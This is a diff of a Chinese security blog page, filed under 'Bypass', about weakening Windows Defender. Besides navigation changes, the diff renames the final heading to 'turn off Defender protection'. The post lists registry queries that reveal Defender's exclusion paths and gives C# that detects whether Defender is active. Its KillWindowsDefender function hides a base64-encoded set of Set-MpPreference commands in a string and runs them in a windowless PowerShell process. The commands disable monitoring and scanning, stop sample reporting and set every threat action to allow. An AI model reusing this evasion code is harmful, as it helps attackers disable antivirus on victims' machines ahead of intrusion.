@@ -14,7 +14,7 @@
 <meta property="og:description" content="Defender白名单注册表键值在新一些的版本中有tamper protect所以就不行了直接向白名单路径下添加值即可  目录及文件：reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot; 后缀：reg query HKEY_LOCAL_MACHINE\SOFTWAR">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-06-19T02:41:40.218Z">
-<meta property="article:modified_time" content="2020-06-19T02:45:58.091Z">
+<meta property="article:modified_time" content="2020-07-14T15:51:58.423Z">
 <meta property="article:author" content="行云">
 <meta name="twitter:card" content="summary">
     
@@ -68,7 +68,9 @@
          
           <li><a href="/archives/">归档</a></li>
          
-          <li><a href="/">项目</a></li>
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
         
       </ul>
     </span>
@@ -107,7 +109,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Defender白名单注册表键值"><span class="toc-number">1.</span> <span class="toc-text">Defender白名单注册表键值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#降低Defender防护能力"><span class="toc-number">2.</span> <span class="toc-text">降低Defender防护能力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测是否是Defender"><span class="toc-number">3.</span> <span class="toc-text">检测是否是Defender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Csharp"><span class="toc-number">4.</span> <span class="toc-text">Csharp</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Defender白名单注册表键值"><span class="toc-number">1.</span> <span class="toc-text">Defender白名单注册表键值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#降低Defender防护能力"><span class="toc-number">2.</span> <span class="toc-text">降低Defender防护能力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测是否是Defender"><span class="toc-number">3.</span> <span class="toc-text">检测是否是Defender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关闭Defender防护"><span class="toc-number">4.</span> <span class="toc-text">关闭Defender防护</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -138,6 +140,11 @@
 
 
       
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Bypass/">Bypass</a>
+    </div>
+
 
       
 
@@ -150,7 +157,7 @@
 <ul>
 <li>目录及文件：<code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</code></li>
 <li>后缀：<code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions</code></li>
-<li>进程：<code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes</code></hr>
+<li>进程：<code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes</code>
 
 </li>
 </ul>
@@ -158,8 +165,8 @@
 
 <h3 id="检测是否是Defender"><a href="#检测是否是Defender" class="headerlink" title="检测是否是Defender"></a>检测是否是Defender</h3><pre><code>using Microsoft.Win32;</code></pre><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">isDefender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span> regPath = <span class="string">@"SOFTWARE\Microsoft\Windows Defender"</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.Default))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (key.GetValue(<span class="string">"DisableAntiSpyware"</span>).ToString() == <span class="string">"1"</span> | key.GetValue(<span class="string">"DisableAntiVirus"</span>).ToString() == <span class="string">"1"</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果没有安装过其他的杀软，那么是没有这两个键值的，也就是还用的defender</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="Csharp"><a href="#Csharp" class="headerlink" title="Csharp"></a>Csharp</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">KillWindowsDefender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span> pj = <span class="string">@"UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgACQAdAByAHUAZQAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAUAByAGkAdgBhAGMAeQBNAG8AZABlACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUwBpAGcAbgBhAHQAdQByAGUARABpAHMAYQBiAGwAZQBVAHAAZABhAHQAZQBPAG4AUwB0AGEAcgB0AHUAcABXAGkAdABoAG8AdQB0AEUAbgBnAGkAbgBlACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBJAG4AdAByAHUAcwBpAG8AbgBQAHIAZQB2AGUAbgB0AGkAbwBuAFMAeQBzAHQAZQBtACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBTAGMAcgBpAHAAdABTAGMAYQBuAG4AaQBuAGcAIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBTAHUAYgBtAGkAdABTAGEAbQBwAGwAZQBzAEMAbwBuAHMAZQBuAHQAIAAyACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ATQBBAFAAUwBSAGUAcABvAHIAdABpAG4AZwAgADAALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBIAGkAZwBoAFQAaAByAGUAYQB0AEQAZQBmAGEAdQBsAHQAQQBjAHQAaQBvAG4AIAA2ACAALQBGAG8AcgBjAGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBNAG8AZABlAHIAYQB0AGUAVABoAHIAZQBhAHQARABlAGYAYQB1AGwAdABBAGMAdABpAG8AbgAgADYALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBMAG8AdwBUAGgAcgBlAGEAdABEAGUAZgBhAHUAbAB0AEEAYwB0AGkAbwBuACAANgAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAFMAZQB2AGUAcgBlAFQAaAByAGUAYQB0AEQAZQBmAGEAdQBsAHQAQQBjAHQAaQBvAG4AIAA2AA=="</span>;</span><br><span class="line">    pj = Encoding.Unicode.GetString(Convert.FromBase64String(pj));</span><br><span class="line">    <span class="comment">//pj = Convert.ToBase64String(Encoding.Unicode.GetBytes(pj));</span></span><br><span class="line"></span><br><span class="line">    Process p = <span class="keyword">new</span> Process();</span><br><span class="line">    p.StartInfo.FileName = <span class="string">@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span>;</span><br><span class="line">    p.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">    p.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">    p.Start();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> i <span class="keyword">in</span> pj.Split(<span class="string">','</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(i);</span><br><span class="line">        p.StandardInput.WriteLine(i);</span><br><span class="line">    &#125;</span><br><span class="line">    p.StandardInput.WriteLine(<span class="string">"exit"</span>);</span><br><span class="line">    p.Dispose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<hr/>
+<h3 id="关闭Defender防护"><a href="#关闭Defender防护" class="headerlink" title="关闭Defender防护"></a>关闭Defender防护</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">KillWindowsDefender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span> pj = <span class="string">@"UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgACQAdAByAHUAZQAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAUAByAGkAdgBhAGMAeQBNAG8AZABlACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUwBpAGcAbgBhAHQAdQByAGUARABpAHMAYQBiAGwAZQBVAHAAZABhAHQAZQBPAG4AUwB0AGEAcgB0AHUAcABXAGkAdABoAG8AdQB0AEUAbgBnAGkAbgBlACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBJAG4AdAByAHUAcwBpAG8AbgBQAHIAZQB2AGUAbgB0AGkAbwBuAFMAeQBzAHQAZQBtACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBTAGMAcgBpAHAAdABTAGMAYQBuAG4AaQBuAGcAIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBTAHUAYgBtAGkAdABTAGEAbQBwAGwAZQBzAEMAbwBuAHMAZQBuAHQAIAAyACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ATQBBAFAAUwBSAGUAcABvAHIAdABpAG4AZwAgADAALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBIAGkAZwBoAFQAaAByAGUAYQB0AEQAZQBmAGEAdQBsAHQAQQBjAHQAaQBvAG4AIAA2ACAALQBGAG8AcgBjAGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBNAG8AZABlAHIAYQB0AGUAVABoAHIAZQBhAHQARABlAGYAYQB1AGwAdABBAGMAdABpAG8AbgAgADYALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBMAG8AdwBUAGgAcgBlAGEAdABEAGUAZgBhAHUAbAB0AEEAYwB0AGkAbwBuACAANgAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAFMAZQB2AGUAcgBlAFQAaAByAGUAYQB0AEQAZQBmAGEAdQBsAHQAQQBjAHQAaQBvAG4AIAA2AA=="</span>;</span><br><span class="line">    pj = Encoding.Unicode.GetString(Convert.FromBase64String(pj));</span><br><span class="line">    <span class="comment">//Console.WriteLine(pj);</span></span><br><span class="line"></span><br><span class="line">    Process p = <span class="keyword">new</span> Process();</span><br><span class="line">    p.StartInfo.FileName = <span class="string">@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span>;</span><br><span class="line">    p.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">    p.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">    p.Start();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> i <span class="keyword">in</span> pj.Split(<span class="string">','</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(i);</span><br><span class="line">        p.StandardInput.WriteLine(i);</span><br><span class="line">    &#125;</span><br><span class="line">    p.StandardInput.WriteLine(<span class="string">"exit"</span>);</span><br><span class="line">    p.Dispose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
   </div>
 </article>
 
@@ -178,13 +185,15 @@
          
           <li><a href="/archives/">归档</a></li>
          
-          <li><a href="/">项目</a></li>
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
         
       </ul>
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Defender白名单注册表键值"><span class="toc-number">1.</span> <span class="toc-text">Defender白名单注册表键值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#降低Defender防护能力"><span class="toc-number">2.</span> <span class="toc-text">降低Defender防护能力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测是否是Defender"><span class="toc-number">3.</span> <span class="toc-text">检测是否是Defender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Csharp"><span class="toc-number">4.</span> <span class="toc-text">Csharp</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Defender白名单注册表键值"><span class="toc-number">1.</span> <span class="toc-text">Defender白名单注册表键值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#降低Defender防护能力"><span class="toc-number">2.</span> <span class="toc-text">降低Defender防护能力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测是否是Defender"><span class="toc-number">3.</span> <span class="toc-text">检测是否是Defender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关闭Defender防护"><span class="toc-number">4.</span> <span class="toc-text">关闭Defender防护</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -217,7 +226,11 @@
         
         <footer id="footer">
   <div class="footer-left">
-    Copyright &copy; 2020 行云
+    Copyright &copy;
+    
+    
+    2020
+    行云
   </div>
   <div class="footer-right">
     <nav>
@@ -229,7 +242,9 @@
          
           <li><a href="/archives/">归档</a></li>
          
-          <li><a href="/">项目</a></li>
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
         
       </ul>
     </nav>
